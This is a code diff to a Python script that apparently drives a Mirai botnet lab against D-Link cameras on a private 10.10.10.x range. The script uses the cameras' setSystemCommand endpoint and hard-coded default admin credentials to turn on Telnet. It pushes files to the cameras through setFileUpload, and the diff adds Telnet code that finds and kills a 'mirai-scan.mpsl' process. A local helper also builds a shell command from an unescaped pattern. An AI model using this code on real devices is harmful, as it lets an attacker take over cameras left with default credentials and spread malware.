@@ -5,12 +5,90 @@ from time import sleep
 import requests
 from requests.auth import HTTPBasicAuth
 import argparse
+import time, re
+
+import subprocess
+
+def kill_process_by_pattern(pattern):
+    """Kills processes matching the specified pattern."""
+    try:
+        # Build the command to find the PIDs of matching processes and kill them
+        command = f"ps aux | grep '{pattern}' | awk '{{print $2}}' | xargs kill -9"
+        
+        # Execute the command
+        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        
+        # Check if the command executed successfully
+        if result.returncode == 0:
+            print(f"[+] Processes matching '{pattern}' have been killed successfully.")
+        else:
+            print(f"[-] Error executing the command: {result.stderr.decode()}")
+    except subprocess.CalledProcessError as e:
+        print(f"[-] Error: {e}")
+    except Exception as e:
+        print(f"[-] Unexpected error: {e}")
+
+USERNAME = "admin"       # Change to the correct username
+PASSWORD = "smcadmin"    # Change to the correct password
+KILL_CMD = "kill -9 {}"  # Command to kill process by PID
+
+def connect_telnet(host, username, password):
+    """Connects to a remote host over Telnet and logs in."""
+    try:
+        tn = telnetlib.Telnet(host, timeout=10)
+        tn.read_until(b"login: ")
+        tn.write(username.encode("utf-8") + b"\n")
+        tn.read_until(b"Password: ")
+        tn.write(password.encode("utf-8") + b"\n")
+        time.sleep(1)  # Wait for login to complete
+        return tn
+    except Exception as e:
+        print(f"Error connecting to {host}: {e}")
+        return None
+
+def execute_command(tn, command):
+    """Executes a command over Telnet and returns the output."""
+    tn.write(command.encode("utf-8") + b"\n")
+    time.sleep(5)  # Give time for the command to execute
+    output = tn.read_very_eager().decode("utf-8", errors="ignore")
+    return output
+
+def find_mirai_pid(output):
+    """Parses the Telnet output to find the PID of mirai.mpsl."""
+    match = re.search(r"/proc/(\d+)/exe -> /mirai-scan\.mpsl", output)
+    if match:
+        return match.group(1)
+    return None
+
+
+def kill_mirai_on_bot(host):
+    tn = connect_telnet(host, USERNAME, PASSWORD)
+    if not tn:
+        return
+
+    print("[+] Executing ls command to find mirai process...")
+    output = execute_command(tn, "ls -l /proc/*/exe | grep mirai")
+    #output = execute_command(tn, "echo Connection Successful")
+    #output = execute_command(tn, "ls")
+    print("output:", output)
+
+    pid = find_mirai_pid(output)
+    if pid:
+        print(f"[+] Found mirai process with PID: {pid}")
+        print("[+] Killing process...")
+        execute_command(tn, KILL_CMD.format(pid))
+        print("[+] Process killed successfully.")
+    else:
+        print("[-] No mirai process found.")
+
+    tn.close()
+
 
 def enable_telnet(host_last_value):
     # Construct the full IP address from the passed parameter
     url = f"http://10.10.10.{host_last_value}/setSystemCommand"
     username = "admin"
-    password = "1234"
+    password = "smcadmin"
 
     # Form data
     data = {
@@ -36,7 +114,7 @@ def upload_file_to_dlink_cam(host_last_value, file_path):
     # Construct the full IP address for file upload
     url = f"http://10.10.10.{host_last_value}/setFileUpload"
     username = "admin"
-    password = "1234"
+    password = "smcadmin"
 
     # Form data for file upload
     data = {
@@ -64,6 +142,7 @@ def upload_file_to_dlink_cam(host_last_value, file_path):
     return response.status_code
 
 if __name__ == "__main__":
+
     # Set up argument parser
     parser = argparse.ArgumentParser(description="Enable Telnet on a specific host and optionally upload a file")
     parser.add_argument("host_last_value", type=int, help="The last value of the IP address (e.g., 6 for 10.10.10.6)")
